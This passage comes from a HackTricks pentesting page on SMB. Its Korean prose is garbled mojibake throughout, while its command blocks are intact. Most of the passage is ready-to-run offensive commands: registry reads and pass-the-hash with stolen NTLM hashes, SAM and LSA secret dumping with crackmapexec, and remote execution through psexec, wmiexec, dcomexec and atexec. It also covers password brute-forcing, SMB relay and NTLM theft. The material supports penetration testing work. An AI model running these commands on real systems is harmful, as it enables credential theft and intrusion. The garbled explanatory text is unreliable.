## ë ˆì§€ìŠ¤íŠ¸ë¦¬ ì½ê¸°

ë°œê²¬ëœ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ì—¬ ë ˆì§€ìŠ¤íŠ¸ë¦¬ë¥¼ **ì½ì„ ìˆ˜** ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Impacket **`reg.py`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡ë ˆì´ì…˜

**Samba** ì„œë²„ì˜ ê¸°ë³¸ êµ¬ì„±ì€ ì¼ë°˜ì ìœ¼ë¡œ `/etc/samba/smb.conf`ì— ìœ„ì¹˜í•˜ë©° ì¼ë¶€ **ìœ„í—˜í•œ êµ¬ì„±**ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

| **ì„¤ì •**                    | **ì„¤ëª…**                                                             |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | í˜„ì¬ ê³µìœ ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ê³µìœ  ëª©ë¡ì„ í—ˆìš©í•©ë‹ˆê¹Œ?                   |
| `read only = no`            | íŒŒì¼ì˜ ìƒì„± ë° ìˆ˜ì •ì„ ê¸ˆì§€í•©ë‹ˆê¹Œ?                                   |
| `writable = yes`            | ì‚¬ìš©ìê°€ íŒŒì¼ì„ ìƒì„±í•˜ê³  ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆê¹Œ?                        |
| `guest ok = yes`            | ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  ì„œë¹„ìŠ¤ì— ì—°ê²°ì„ í—ˆìš©í•©ë‹ˆê¹Œ?                 |
| `enable privileges = yes`   | íŠ¹ì • SIDì— í• ë‹¹ëœ ê¶Œí•œì„ ì¡´ì¤‘í•©ë‹ˆê¹Œ?                                |
| `create mask = 0777`        | ìƒˆë¡œ ìƒì„±ëœ íŒŒì¼ì— í• ë‹¹í•´ì•¼ í•˜ëŠ” ê¶Œí•œì€ ë¬´ì—‡ì…ë‹ˆê¹Œ?                 |
| `directory mask = 0777`     | ìƒˆë¡œ ìƒì„±ëœ ë””ë ‰í† ë¦¬ì— í• ë‹¹í•´ì•¼ í•˜ëŠ” ê¶Œí•œì€ ë¬´ì—‡ì…ë‹ˆê¹Œ?           |
| `logon script = script.sh`  | ì‚¬ìš©ì ë¡œê·¸ì¸ ì‹œ ì‹¤í–‰í•´ì•¼ í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ëŠ” ë¬´ì—‡ì…ë‹ˆê¹Œ?               |
| `magic script = script.sh`  | ìŠ¤í¬ë¦½íŠ¸ê°€ ë‹«í ë•Œ ì‹¤í–‰í•´ì•¼ í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ëŠ” ë¬´ì—‡ì…ë‹ˆê¹Œ?           |
| `magic output = script.out` | ë§ˆë²• ìŠ¤í¬ë¦½íŠ¸ì˜ ì¶œë ¥ì„ ì €ì¥í•´ì•¼ í•˜ëŠ” ìœ„ì¹˜ëŠ” ì–´ë””ì…ë‹ˆê¹Œ?            |

ëª…ë ¹ì–´ `smbstatus`ëŠ” **ì„œë²„** ë° **ëˆ„ê°€ ì—°ê²°ë˜ì–´ ìˆëŠ”ì§€**ì— ëŒ€í•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

## Kerberosë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ì¦

**smbclient** ë° **rpcclient** ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **kerberos**ì— **ì¸ì¦**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **ëª…ë ¹ì–´ ì‹¤í–‰**

### **crackmapexec**

crackmapexecì€ **wmiexec**ê°€ **ê¸°ë³¸** ë°©ë²•ì¸ **mmcexec, smbexec, atexec, wmiexec** ì¤‘ **ì–´ë–¤ ê²ƒ**ì´ë“  **ë‚¨ìš©**í•˜ì—¬ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ìš©í•˜ë ¤ëŠ” ì˜µì…˜ì„ `--exec-method` ë§¤ê°œë³€ìˆ˜ë¡œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

ë‘ ì˜µì…˜ ëª¨ë‘ í”¼í•´ì ì»´í“¨í„°ì— _\pipe\svcctl_ì„ í†µí•´ ìƒˆ ì„œë¹„ìŠ¤ë¥¼ **ìƒì„±**í•˜ê³  ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë¬´ì–¸ê°€ë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤ (**psexec**ì€ ì‹¤í–‰ íŒŒì¼ì„ ADMIN$ ê³µìœ ì— **ì—…ë¡œë“œ**í•˜ê³  **smbexec**ì€ **cmd.exe/powershell.exe**ë¥¼ ê°€ë¦¬í‚¤ë©° ì¸ìˆ˜ì— í˜ì´ë¡œë“œë¥¼ ë„£ìŠµë‹ˆë‹¤ --**íŒŒì¼ ì—†ëŠ” ê¸°ìˆ --**-).\
[**psexec** ](../windows-hardening/ntlm/psexec-and-winexec.md)ë° [**smbexec**](../windows-hardening/ntlm/smbexec.md)ì— ëŒ€í•œ **ì¶”ê°€ ì •ë³´**.\
**kali**ì—ì„œëŠ” /usr/share/doc/python3-impacket/examples/ì— ìœ„ì¹˜í•©ë‹ˆë‹¤.
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
**ë§¤ê°œë³€ìˆ˜**`-k`ë¥¼ ì‚¬ìš©í•˜ì—¬ **NTLM** ëŒ€ì‹  **kerberos**ì— ëŒ€í•´ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

**í¬íŠ¸ 135**ë¥¼ í†µí•´ **DCOM**ì„ ì‚¬ìš©í•˜ì—¬ ë””ìŠ¤í¬ë¥¼ ê±´ë“œë¦¬ì§€ ì•Šê³  ìƒˆ ì„œë¹„ìŠ¤ë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šê³  ëª…ë ¹ ì…¸ì„ ì€ë°€í•˜ê²Œ ì‹¤í–‰í•©ë‹ˆë‹¤.\
**kali**ì—ì„œëŠ” /usr/share/doc/python3-impacket/examples/ì— ìœ„ì¹˜í•©ë‹ˆë‹¤.
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
**ë§¤ê°œë³€ìˆ˜**`-k`ë¥¼ ì‚¬ìš©í•˜ì—¬ **NTLM** ëŒ€ì‹  **kerberos**ì— ëŒ€í•´ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../windows-hardening/ntlm/atexec.md)

_\\pipe\atsvc_ë¥¼ í†µí•´ ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ë¥¼ í†µí•´ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.\
**kali**ì—ì„œëŠ” /usr/share/doc/python3-impacket/examples/ì— ìœ„ì¹˜í•©ë‹ˆë‹¤.
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket ì°¸ì¡°

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **ì‚¬ìš©ì ìê²© ì¦ëª… ë¸Œë£¨íŠ¸í¬ìŠ¤**

**ì´ê²ƒì€ ê¶Œì¥ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ìµœëŒ€ í—ˆìš© ì‹œë„ íšŸìˆ˜ë¥¼ ì´ˆê³¼í•˜ë©´ ê³„ì •ì´ ì°¨ë‹¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB ë¦´ë ˆì´ ê³µê²©

ì´ ê³µê²©ì€ Responder íˆ´í‚·ì„ ì‚¬ìš©í•˜ì—¬ ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì—ì„œ **SMB ì¸ì¦ ì„¸ì…˜ì„ ìº¡ì²˜**í•˜ê³  **íƒ€ê²Ÿ ë¨¸ì‹ **ìœ¼ë¡œ **ë¦´ë ˆì´**í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì¸ì¦ **ì„¸ì…˜ì´ ì„±ê³µí•˜ë©´**, ìë™ìœ¼ë¡œ **ì‹œìŠ¤í…œ ì‰˜**ë¡œ ì§„ì…í•©ë‹ˆë‹¤.\
[**ì´ ê³µê²©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows ë¼ì´ë¸ŒëŸ¬ë¦¬ URLMon.dllì€ í˜ì´ì§€ê°€ SMBë¥¼ í†µí•´ ì¼ë¶€ ì½˜í…ì¸ ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  ì‹œë„í•  ë•Œ í˜¸ìŠ¤íŠ¸ì— ìë™ìœ¼ë¡œ ì¸ì¦ì„ ì‹œë„í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: `img src="\\10.10.10.10\path\image.jpg"`

ì´ëŠ” ë‹¤ìŒ í•¨ìˆ˜ë“¤ë¡œ ë°œìƒí•©ë‹ˆë‹¤:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

ì´ í•¨ìˆ˜ë“¤ì€ ì¼ë¶€ ë¸Œë¼ìš°ì € ë° ë„êµ¬ (ì˜ˆ: Skype)ì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤.

![ì¶œì²˜: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### MitMfë¥¼ ì‚¬ìš©í•œ SMBTrap

![ì¶œì²˜: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM ë„ìš©

SMB í•¨ì •ê³¼ ìœ ì‚¬í•˜ê²Œ, ì•…ì˜ì ì¸ íŒŒì¼ì„ ëŒ€ìƒ ì‹œìŠ¤í…œì— ì‹¬ëŠ” ê²ƒ (ì˜ˆ: SMBë¥¼ í†µí•´)ì€ SMB ì¸ì¦ ì‹œë„ë¥¼ ìœ ë„í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ NetNTLMv2 í•´ì‹œë¥¼ Responderì™€ ê°™ì€ ë„êµ¬ë¡œ ê°€ë¡œì±Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ í•´ì‹œëŠ” ì˜¤í”„ë¼ì¸ì—ì„œ í•´ë…ë˜ê±°ë‚˜ [SMB ë¦´ë ˆì´ ê³µê²©](pentesting-smb.md#smb-relay-attack)ì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[ì°¸ì¡°: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks ìë™ ëª…ë ¹ì–´
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong></summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì—ì„œ ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›í•œë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [telegram ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ë‹¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
